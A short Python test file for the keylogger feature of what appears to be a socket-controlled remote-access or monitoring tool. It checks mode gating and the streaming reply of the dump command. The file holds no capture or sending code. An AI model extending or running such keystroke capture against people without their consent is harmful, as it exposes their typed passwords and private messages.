"""
Tests for keylogger feature
"""

import pytest
from unittest.mock import Mock, patch
from utils.features.keylogger import start_keylogger, stop_keylogger, dump_keylog
from utils.modes import Mode, ModeManager


def test_keylogger_mode_check(mock_socket, mode_manager):
    """Test keylogger checks mode before starting"""
    # Set mode to something else
    mode_manager.set_mode(Mode.SCREENRECORD)
    
    with patch('utils.protocol.send_text') as mock_send:
        start_keylogger(mock_socket, mode_manager)
        
        # Should send error message
        assert mock_send.called
        args = mock_send.call_args[0]
        assert "ERROR" in args[1]


def test_keylogger_dump_info(mock_socket, mode_manager):
    """Test /keylogger/dump provides streaming info"""
    with patch('utils.protocol.send_text') as mock_send:
        dump_keylog(mock_socket, mode_manager)
        
        assert mock_send.called
        args = mock_send.call_args[0]
        assert "streaming" in args[1].lower()


# Additional tests for:
# - Successful keylogger start
# - Keystroke capture
# - Stop functionality

